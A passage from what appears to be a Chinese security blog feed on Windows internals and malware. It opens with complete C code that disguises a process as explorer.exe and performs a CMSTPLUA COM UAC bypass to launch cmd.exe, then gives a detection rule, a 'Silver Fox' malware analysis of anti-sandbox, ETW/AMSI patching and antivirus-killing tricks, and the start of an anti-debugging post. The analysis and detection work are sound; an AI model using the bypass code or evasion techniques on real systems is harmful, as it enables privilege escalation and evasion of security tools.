SavedPriorityState;</span><br><span class="line">    ULONG_PTR SoftPatchPtr1;</span><br><span class="line">    PVOID ThreadPoolData;</span><br><span class="line">    PVOID* TlsExpansionSlots;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_M_X64)</span></span><br><span class="line">    PVOID DeallocationBStore;</span><br><span class="line">    PVOID BStoreLimit;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ULONG MuiGeneration;</span><br><span class="line">    ULONG IsImpersonating;</span><br><span class="line">    PVOID NlsCache;</span><br><span class="line">    PVOID pShimData;</span><br><span class="line">    ULONG HeapVirtualAffinity;</span><br><span class="line">    HANDLE CurrentTransactionHandle;</span><br><span class="line">    PTEB_ACTIVE_FRAME ActiveFrame;</span><br><span class="line">    PVOID FlsData;</span><br><span class="line">    PVOID PreferredLanguages;</span><br><span class="line">    PVOID UserPrefLanguages;</span><br><span class="line">    PVOID MergedPrefLanguages;</span><br><span class="line">    ULONG MuiImpersonation;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        USHORT CrossTebFlags;</span><br><span class="line">        USHORT SpareCrossTebBits : <span class="number">16</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span> &#123;</span><br><span class="line">        USHORT SameTebFlags;</span><br><span class="line">        <span class="keyword">struct</span> &#123;</span><br><span class="line">            USHORT SafeThunkCall : <span class="number">1</span>;</span><br><span class="line">            USHORT InDebugPrint : <span class="number">1</span>;</span><br><span class="line">            USHORT HasFiberData : <span class="number">1</span>;</span><br><span class="line">            USHORT SkipThreadAttach : <span class="number">1</span>;</span><br><span class="line">            USHORT WerInShipAssertCode : <span class="number">1</span>;</span><br><span class="line">            USHORT RanProcessInit : <span class="number">1</span>;</span><br><span class="line">            USHORT ClonedThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SuppressDebugMsg : <span class="number">1</span>;</span><br><span class="line">            USHORT DisableUserStackWalk : <span class="number">1</span>;</span><br><span class="line">            USHORT RtlExceptionAttached : <span class="number">1</span>;</span><br><span class="line">            USHORT InitialThread : <span class="number">1</span>;</span><br><span class="line">            USHORT SpareSameTebBits : <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    PVOID TxnScopeEnterCallback;</span><br><span class="line">    PVOID TxnScopeExitCallback;</span><br><span class="line">    PVOID TxnScopeContext;</span><br><span class="line">    ULONG LockCount;</span><br><span class="line">    ULONG SpareUlong0;</span><br><span class="line">    PVOID ResourceRetValue;</span><br><span class="line">&#125; TEB, *PTEB;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(NTAPI* PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION)</span><span class="params">(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">PVOID</span><span class="params">(NTAPI* LPRTLINITUNICODESTRING)</span><span class="params">(_Inout_ PUNICODE_STRING DestinationString, _In_opt_ PCWSTR SourceString)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPRTLENTERCRITICALSECTION)</span><span class="params">(_In_ PRTL_CRITICAL_SECTION CriticalSection)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPRTLLEAVECRITICALSECTION)</span><span class="params">(_In_ PRTL_CRITICAL_SECTION CriticalSection)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPLDRENUMERATELOADEDMODULES)</span><span class="params">(_In_opt_ ULONG Flags, _In_ PLDR_LOADED_MODULE_ENUMERATION_CALLBACK_FUNCTION CallbackFunction, _In_opt_ PVOID Context)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI* LPNTALLOCATEVIRTUALMEMORY)</span><span class="params">(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect)</span></span>;</span><br><span class="line"></span><br><span class="line">LPRTLINITUNICODESTRING RtlInitUnicodeString;</span><br><span class="line">LPRTLENTERCRITICALSECTION RtlEnterCriticalSection;</span><br><span class="line">LPRTLLEAVECRITICALSECTION RtlLeaveCriticalSection;</span><br><span class="line">LPLDRENUMERATELOADEDMODULES LdrEnumerateLoadedModules;</span><br><span class="line">LPNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;</span><br><span class="line"></span><br><span class="line">LPWSTR g_lpszExplorer2 = (LPWSTR)<span class="string">L&quot;C:\\windows\\explorer.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID NTAPI <span class="title">supxLdrEnumModulesCallback</span><span class="params">(_In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry, _In_ PVOID Context, _Inout_ BOOLEAN* StopEnumeration)</span> </span>&#123;</span><br><span class="line">    PPEB Peb = (PPEB)Context;</span><br><span class="line">    <span class="keyword">if</span> (DataTableEntry-&gt;DllBase == Peb-&gt;ImageBaseAddress) &#123;</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;DataTableEntry-&gt;FullDllName, g_lpszExplorer2);</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;DataTableEntry-&gt;BaseDllName, <span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">        *StopEnumeration = TRUE;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *StopEnumeration = FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__inline <span class="keyword">struct</span> <span class="title class_">_PEB</span>* <span class="built_in">NtCurrentPeb</span>() &#123; <span class="keyword">return</span> <span class="built_in">NtCurrentTeb</span>()-&gt;ProcessEnvironmentBlock; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">supMasqueradeProcess</span><span class="params">(VOID)</span> </span>&#123;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    PPEB Peb = <span class="built_in">NtCurrentPeb</span>();</span><br><span class="line">    SIZE_T RegionSize = <span class="number">0x1000</span>;</span><br><span class="line">    PVOID g_lpszExplorer = <span class="literal">NULL</span>;</span><br><span class="line">    Status = <span class="built_in">NtAllocateVirtualMemory</span>(<span class="built_in">NtCurrentProcess</span>(), &amp;g_lpszExplorer, <span class="number">0</span>, &amp;RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="built_in">RtlEnterCriticalSection</span>(Peb-&gt;FastPebLock);</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;Peb-&gt;ProcessParameters-&gt;ImagePathName, g_lpszExplorer2);</span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;Peb-&gt;ProcessParameters-&gt;CommandLine, g_lpszExplorer2);</span><br><span class="line">        <span class="built_in">RtlLeaveCriticalSection</span>(Peb-&gt;FastPebLock);</span><br><span class="line">        <span class="built_in">LdrEnumerateLoadedModules</span>(<span class="number">0</span>, &amp;supxLdrEnumModulesCallback, (PVOID)Peb);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">HRESULT <span class="title">CoCreateInstanceAsAdmin</span><span class="params">(HWND hwnd, REFCLSID rclsid, REFIID riid, __out <span class="type">void</span>** ppv)</span> </span>&#123;</span><br><span class="line">    BIND_OPTS3 bo;</span><br><span class="line">    WCHAR wszCLSID[<span class="number">50</span>];</span><br><span class="line">    WCHAR wszMonikerName[<span class="number">300</span>];</span><br><span class="line">    <span class="built_in">CoInitialize</span>(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">StringFromGUID2</span>(rclsid, wszCLSID, <span class="built_in">sizeof</span>(wszCLSID) / <span class="built_in">sizeof</span>(wszCLSID[<span class="number">0</span>]));</span><br><span class="line">    HRESULT hr = <span class="built_in">StringCchPrintfW</span>(wszMonikerName, <span class="built_in">sizeof</span>(wszMonikerName) / <span class="built_in">sizeof</span>(wszMonikerName[<span class="number">0</span>]), <span class="string">L&quot;Elevation:Administrator!new:%s&quot;</span>, wszCLSID);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) <span class="keyword">return</span> hr;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;bo, <span class="number">0</span>, <span class="built_in">sizeof</span>(bo));</span><br><span class="line">    bo.cbStruct = <span class="built_in">sizeof</span>(bo);</span><br><span class="line">    bo.hwnd = hwnd;</span><br><span class="line">    bo.dwClassContext = CLSCTX_LOCAL_SERVER;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">CoGetObject</span>(wszMonikerName, &amp;bo, riid, ppv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMLuaUtilBypassUAC</span><span class="params">(LPWSTR lpwszExecutable)</span> </span>&#123;</span><br><span class="line">    HRESULT hr = <span class="number">0</span>;</span><br><span class="line">    CLSID clsidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    IID iidICMLuaUtil = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    ICMLuaUtil* CMLuaUtil = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">CLSIDFromString</span>(CLSID_CMSTPLUA, &amp;clsidICMLuaUtil);</span><br><span class="line">    <span class="built_in">IIDFromString</span>(IID_ICMLuaUtil, &amp;iidICMLuaUtil);</span><br><span class="line">    <span class="built_in">CoCreateInstanceAsAdmin</span>(<span class="literal">NULL</span>, clsidICMLuaUtil, iidICMLuaUtil, (PVOID*)(&amp;CMLuaUtil));</span><br><span class="line">    hr = CMLuaUtil-&gt;lpVtbl-&gt;<span class="built_in">ShellExec</span>(CMLuaUtil, lpwszExecutable, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>, SW_SHOW);</span><br><span class="line">    CMLuaUtil-&gt;lpVtbl-&gt;<span class="built_in">Release</span>(CMLuaUtil);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">SUCCEEDED</span>(hr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    HMODULE hNtdll = <span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">    NtAllocateVirtualMemory = (LPNTALLOCATEVIRTUALMEMORY)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;NtAllocateVirtualMemory&quot;</span>);</span><br><span class="line">    RtlEnterCriticalSection = (LPRTLENTERCRITICALSECTION)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;RtlEnterCriticalSection&quot;</span>);</span><br><span class="line">    RtlInitUnicodeString = (LPRTLINITUNICODESTRING)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;RtlInitUnicodeString&quot;</span>);</span><br><span class="line">    RtlLeaveCriticalSection = (LPRTLLEAVECRITICALSECTION)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;RtlLeaveCriticalSection&quot;</span>);</span><br><span class="line">    LdrEnumerateLoadedModules = (LPLDRENUMERATELOADEDMODULES)<span class="built_in">GetProcAddress</span>(hNtdll, <span class="string">&quot;LdrEnumerateLoadedModules&quot;</span>);</span><br><span class="line">    <span class="built_in">supMasqueradeProcess</span>();</span><br><span class="line">    <span class="built_in">CMLuaUtilBypassUAC</span>((LPWSTR)<span class="string">L&quot;c:\\windows\\system32\\cmd.exe&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/image/2026-02-08-learning_windows_6/1770637159312.png" alt="1770637159312"></p><p><img src="/image/2026-02-08-learning_windows_6/1770637290822.png" alt="1770637290822"></p><h6 id="检测方法-2"><a href="#检测方法-2" class="headerlink" title="检测方法"></a>检测方法</h6><p>这种 Bypass UAC 手段的核心特征是：</p><ol><li>恶意程序调用 COM 接口。</li><li>Windows 自动拉起一个高权限的 <code>dllhost.exe</code> 来承载该 COM 对象（因为 <code>CMSTPLUA</code> 支持自动提权）。</li><li>该 <code>dllhost.exe</code> 启动子进程（如 <code>cmd.exe</code>），其命令行会包含请求的 COM 组件的 CLSID</li></ol><p><img src="/image/2026-02-08-learning_windows_6/1770637587826.png" alt="1770637587826"></p><p>因此可以撰写的检测规则如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">any where winlog.event_id == 1 and</span><br><span class="line">winlog.event_data.ParentImage regex &quot;.*\\\\dllhost\\.exe&quot; and</span><br><span class="line">winlog.event_data.ParentCommandLine : &quot;*3E5FC7F9-9A51-4367-9063-A120244FBEC7*&quot;</span><br></pre></td></tr></table></figure><p><img src="/image/2026-02-08-learning_windows_6/1770638446474.png" alt="1770638446474"></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从银狐样本看反调试/反沙箱</title>
      <link href="/2026/02/06/2026-02-06-malware_analysis_1/"/>
      <url>/2026/02/06/2026-02-06-malware_analysis_1/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="从一个银狐样本看反沙箱"><a href="#从一个银狐样本看反沙箱" class="headerlink" title="从一个银狐样本看反沙箱"></a>从一个银狐样本看反沙箱</h1><p>元数据</p><p>MD5: df2f4aad13fb6d08332e09fd47cd0c98</p><p>SHA-256: 127640be5bfb1e4f4a25504738898642b69fe6d461c328633ac29aa256044acb</p><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p>程序直接分配一个可执行区域去执行shellcode了</p><p><img src="/image/2026-02-06-malware_analysis_1/1770365239744.png" alt="1770365239744"></p><p>shellcode部分是使用了call+pop的方式对后续的地址进行异或解密的操作。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770365350857.png" alt="1770365350857"></p><p><img src="/image/2026-02-06-malware_analysis_1/1770365393491.png" alt="1770365393491"></p><p>转到x64dbg中调试分析，可以看到这里有一个循环解密的过程，在这里下个条件断点</p><p><img src="/image/2026-02-06-malware_analysis_1/1770364548152.png" alt="1770364548152"></p><p>经过两次jmp后进入解密后的shellcode的执行区域，把这块VirtualAlloc分配给shellcode的区域dump下来，在使用IDA打开。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770364716595.png" alt="1770364716595"></p><p>这里直接用MCP分析一遍，对函数、变量进行重命名补全，得到下面的结果：</p><p>初始化，动态 API 解析：先拿到 <code>MessageBoxA/MessageBoxW/Sleep</code>。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770366753690.png" alt="1770366753690"></p><p><code>fn_resolve_api</code>动态解析 <code>LoadLibraryA/GetProcAddress</code>，然后用俩Api获取函数地址。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770366837139.png" alt="1770366837139"></p><p>遍历模块链表 <code>TEB-&gt;Peb-&gt;Ldr-&gt;InLoadOrderModuleList</code>，对比模块名Hash拿到模块基地址</p><p><img src="/image/2026-02-06-malware_analysis_1/1770366895216.png" alt="1770366895216"></p><p>从模块头部 <code>OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress</code>获取导出表的位置，从导出表中获取函数名和函数地址。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770367089866.png" alt="1770367089866"></p><p><code>fn_preflight_anti_analysis_exit</code>先是进行ETW 与 AMSI致盲</p><p><img src="/image/2026-02-06-malware_analysis_1/1770367276565.png" alt="1770367276565"></p><p>ETW 与 AMSI 补丁</p><p>找到 <code>NtTraceEvent</code>&#x2F;<code>AmsiScanBuffer</code> 入口地址， <code>VirtualProtect(..., PAGE_EXECUTE_READWRITE)</code>修改属性，写入 <code>0xC3</code>（ret）后恢复原保护。</p><p><code>fn_exit_if_name_matches_myapp</code>使用 <code>GetModuleFileNameW</code> 取自身路径，比较后缀是否为 <code>:\\myapp.exe</code></p><p><code>fn_exception_probe_status</code></p><ul><li>通过 <code>LdrGetDllHandleEx</code> 获取 <code>ntdll.dll</code> 的基址。</li><li>使用 <code>RtlImageDirectoryEntryToData</code> 获取异常目录（Exception Directory）的数据指针。</li><li>遍历运行时的函数表（Runtime Function Table）。</li><li>计算表中数据的哈希值，并与预设的“黑名单”哈希值进行比对。</li></ul><p><img src="/image/2026-02-06-malware_analysis_1/1770373426699.png" alt="1770373426699"></p><p><code>fn_detect_job_object_status</code>和 <code>fn_ntcompresskey_probe</code>利用Defender模拟执行环境某些api（NtIsProcessInJob、NtCompressKey）的硬编码的返回值来探测是否运行在Defender环境，该操作的出处：<a href="https://github.com/hfiref0x/UACME/blob/master/Source/Shared/windefend.c">UACME&#x2F;Source&#x2F;Shared&#x2F;windefend.c at master · hfiref0x&#x2F;UACME</a></p><p><img src="/image/2026-02-06-malware_analysis_1/1770373498698.png" alt="1770373498698"></p><p><img src="/image/2026-02-06-malware_analysis_1/1770373639558.png" alt="1770373639558"></p><p><code>fn_pid_dll_probe</code>调用了 <code>pid.DllGetClassObject</code></p><p><img src="/image/2026-02-06-malware_analysis_1/1770374023566.png" alt="1770374023566"></p><p><code>fn_heap_stress_loop_check</code>分配大量内存（95MB），释放它，然后执行一个1亿次的空循环，猜测此过程可能是用于检测某些沙箱为了缩短检测时间直接跳过的情况。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770381068697.png" alt="1770381068697"></p><p><code>fn_virtualalloc_numa_or_module_check</code>调用 <code>VirtualAllocExNuma</code> 申请物理内存，此函数的运行环境要求存在多个物理CPU；判断SxIn.dll模块是否被当前进程加载(360沙箱的分析dll) ；</p><p><code>fn_parent_chain_guard</code>检查进程信息</p><p><img src="/image/2026-02-06-malware_analysis_1/1770374854964.png" alt="1770374854964"></p><p>里面的几个函数都利用 <code>CreateToolhelp32Snapshot</code>、<code>Process32First</code>和 <code>Process32Next</code>来查找PID、进程名，</p><p><code>fn_has_cmd_flag_t</code>函数会调用 <code>GetCommandLineW</code> 和 <code>CommandLineToArgvW</code> 获取并解析当前进程的命令行参数。它会遍历参数列表，查找是否存在参数”t” 。</p><p><code>fn_check_admin_token_sid</code>验证当前进程是否以 LocalSystem (本地系统账户) 身份运行：</p><ol><li>调用 <code>OpenProcessToken</code> 打开当前进程的访问令牌。</li><li>调用 <code>GetTokenInformation</code> 并传入 <code>TokenUser</code> (1)，获取当前令牌的用户 SID。</li><li>调用 <code>AllocateAndInitializeSid</code> 构建一个用于比对的 SID。生成的 SID 为 S-1-5-18 (即 <code>NT AUTHORITY\SYSTEM</code>)。</li><li>调用 <code>EqualSid</code> 判断当前进程的用户 SID 是否等于生成的 LocalSystem SID。</li></ol><p>该检查通过条件是：</p><p>1、进程命令行参数列表中有一个参数为’t’<br>2、样本父进程&#x2F;父父进程为Explorer进程。<br>3、MsiExec.exe进程存货并且当前进程的SID和AllocateAndInitializeSid初始化的SID一致。</p><p>使用 <code>GetSystemInfo</code> 检查 <code>dwNumberOfProcessors</code>，查看CPU核心数量是否小于2</p><p><code>fn_single_instance_mutex</code>函数中使用 <code>CreateMutexW</code>基于计算机名创建互斥体。</p><p><code>fn_try_self_uac_bypass</code>函数实现了UAC强制自提权行为，</p><p>首先调用 <code>fn_get_token_elevation_type</code> 检查当前令牌权限</p><p><img src="/image/2026-02-06-malware_analysis_1/1770385402549.png" alt="1770385402549"></p><p>调用 <code>ShellExecuteExA</code> 执行上述 <code>runas</code> 动词结构。在 Windows 中，对可执行文件使用 <code>runas</code> 动词会触发标准的 UAC 提权确认弹窗（“您是否允许此应用对您的设备进行更改？”）。不断循环死缠烂打。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770385447450.png" alt="1770385447450"></p><p><code>fn_sleep_skew_check</code>函数中对比两次获取 Tick (<code>GetTickCount64</code>)和其中 <code>Sleep(300)</code>请求睡眠时间的差异。沙箱为了快速输出分析报告，通常会 Hook <code>Sleep</code> 函数，使其立即返回。</p><p><code>fn_rdtsc_timing_probe</code> 使用汇编指令 <code>rdtsc</code> 读取 CPU 时间戳计数器。在一段微小操作前后分别读取，计算差值。</p><p><code>fn_detect_360_products</code>函数中 检查 <code>360tray.exe</code>, <code>360sd.exe</code> 等进程，利用 <code>FindWindowExA</code>检查 <code>Q360SafeMonClass</code>窗口，如果有则会进入一个对抗过程。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770382885307.png" alt="1770382885307"></p><p>会在一个循环中连续启动5个干扰线程 ，线程函数为 <code>fn_counter_360_processes</code>，这些线程会并行运行</p><p><img src="/image/2026-02-06-malware_analysis_1/1770384537479.png" alt="1770384537479"></p><p><code>fn_counter_360_processes</code>通过 <code>CreateToolhelp32Snapshot</code> 遍历所有进程，找到 360 相关进程 ID (PID) 后，调用 <code>EnumWindows</code> 枚举属于该 PID 的所有窗口</p><p><img src="/image/2026-02-06-malware_analysis_1/1770384568656.png" alt="1770384568656"></p><p>回调函数 <code>fn_window_kill_callback</code> 会向 360 的窗口发送以下消息：</p><ul><li><code>PostMessageA(..., 18, ...)</code>：发送 <code>WM_QUIT</code> (0x12) 消息，请求程序退出消息循环。</li><li><code>SendMessageA(..., 16, ...)</code>：发送 <code>WM_CLOSE</code> (0x10) 消息，模拟点击关闭按钮。<br>这旨在强行关闭 360 的监控窗口或托盘图标，使其从用户视野消失。</li></ul><p>为了防止低权限进程无法向高权限窗口发送消息（UIPI 机制），代码调用了 <code>ChangeWindowMessageFilter</code> 和 <code>ChangeWindowMessageFilterEx</code>，试图允许特定消息通过过滤器。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770384670519.png" alt="1770384670519"></p><p>调用 <code>GenerateConsoleCtrlEvent(..., window_pid, 2)</code>（2 代表 <code>CTRL_BREAK_EVENT</code>）。这是一种强制终止控制台进程组的技术，试图从底层杀掉关联的进程。</p><p>调用 <code>fn_kill_threads_by_owner_pid</code>，遍历目标进程的所有线程，并对每个线程使用 <code>PostThreadMessageA</code> 发送 <code>WM_QUIT</code> (18)，试图让线程内部的消息循环终止。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770384935933.png" alt="1770384935933"></p><p>主线程还会执行一个 <code>messagebox_loop_idx</code> 循环，连续弹出 100 次 <code>MessageBoxA</code>进行弹窗混淆，掩盖对抗行为。</p><p>如果360进程不存在&#x2F;被成功干掉了，会通过 <code>Powershell</code>对指定目录加白。</p><p><img src="/image/2026-02-06-malware_analysis_1/1770385738772.png" alt="1770385738772"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Sleep 加速检测 ：调用 <code>Sleep(300)</code> 并对比 <code>GetTickCount64</code> 的实际差值，沙箱可能会跳过睡眠</p><p>时间戳检测： <code>rdtsc</code> 读取 CPU 时间戳计数器</p><p>NUMA API 探测 ：调用 <code>VirtualAllocExNuma</code>，许多简易沙箱不支持此 API</p><p>CPU 核心数检查 ：检查 CPU 核心是否少于 2 个</p><p>堆压力测试 ：分配 100MB 内存并执行 1 亿次空循环</p><p>Defender 模拟器探测</p><ul><li><code>NtIsProcessInJob</code> ：传入特定句柄，检查返回值是否为 <code>0x125</code></li><li><code>NtCompressKey</code> ：传入无效句柄，如果返回“成功”，说明是模拟器的“宽容”执行机制。</li></ul><p>进程名和窗口名检查：通过进程名（<code>360tray.exe</code> 等）和窗口类名（<code>Q360SafeMonClass</code>）发现 360。</p><p>UAC强制自提权：在一个无限循环中不断调用 <code>ShellExecuteExA</code> 并带上 <code>runas</code> 参数，请求管理员权限。</p><p>Patch ETW：修改 <code>ntdll.dll</code> 内存，把 <code>NtTraceEvent</code> 函数开头改成 <code>ret</code>，所有事件上报都会从这里进入内核态。</p><p>使用 <code>ChangeWindowMessageFilter</code>允许 <code>WM_CLOSE</code> (关闭) 和 <code>WM_QUIT</code> (退出)通过360 窗口的过滤器。</p>]]></content>
      
      
      <categories>
          
          <category> malware </category>
          
          <category> windows </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 学习（五）-- 反调试和反沙箱</title>
      <link href="/2025/12/31/2025-12-31-learning_windows_5/"/>
      <url>/2025/12/31/2025-12-31-learning_windows_5/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h1><h2 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h2><h3 id="PEB标志位检测"><a href="#PEB标志位检测" class="headerlink" title="PEB标志位检测"></a>PEB标志位检测</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _PEB</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +0x000 InheritedAddressSpace : UChar</span><br><span class="line">   +0x001 ReadImageFileExecOptions : UChar</span><br><span class="line">   +0x002 BeingDebugged    : UChar</span><br><span class="line">   +0x003 BitField         : UChar</span><br><span class="line">   +0x003 ImageUsesLargePages : Pos 0, 1 Bit</span><br><span class="line">   +0x003 IsProtectedProcess : Pos 1, 1 Bit</span><br><span class="line">   +0x003 IsLegacyProcess  : Pos 2, 1 Bit</span><br><span class="line">   +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit</span><br><span class="line">   +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit</span><br><span class="line">   +0x003 SpareBits        : Pos 5, 3 Bits</span><br><span class="line">   +0x004 Mutant           : Ptr32 Void</span><br><span class="line">   +0x008 ImageBaseAddress : Ptr32 Void</span><br><span class="line">   +0x00c Ldr              : Ptr32 _PEB_LDR_DATA</span><br><span class="line">   +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +0x014 SubSystemData    : Ptr32 Void</span><br><span class="line">   +0x018 ProcessHeap      : Ptr32 Void</span><br><span class="line">   +0x01c FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +0x020 AtlThunkSListPtr : Ptr32 Void</span><br><span class="line">   +0x024 IFEOKey          : Ptr32 Void</span><br><span class="line">   +0x028 CrossProcessFlags : Uint4B</span><br><span class="line">   +0x028 ProcessInJob     : Pos 0, 1 Bit</span><br><span class="line">   +0x028 ProcessInitializing : Pos 1, 1 Bit</span><br><span class="line">   +0x028 ProcessUsingVEH  : Pos 2, 1 Bit</span><br><span class="line">   +0x028 ProcessUsingVCH  : Pos 3, 1 Bit</span><br><span class="line">   +0x028 ProcessUsingFTH  : Pos 4, 1 Bit</span><br><span class="line">   +0x028 ReservedBits0    : Pos 5, 27 Bits</span><br><span class="line">   +0x02c KernelCallbackTable : Ptr32 Void</span><br><span class="line">   +0x02c UserSharedInfoPtr : Ptr32 Void</span><br><span class="line">   +0x030 SystemReserved   : [1] Uint4B</span><br><span class="line">   +0x034 AtlThunkSListPtr32 : Uint4B</span><br><span class="line">   +0x038 ApiSetMap        : Ptr32 Void</span><br><span class="line">   +0x03c TlsExpansionCounter : Uint4B</span><br><span class="line">   +0x040 TlsBitmap        : Ptr32 Void</span><br><span class="line">   +0x044 TlsBitmapBits    : 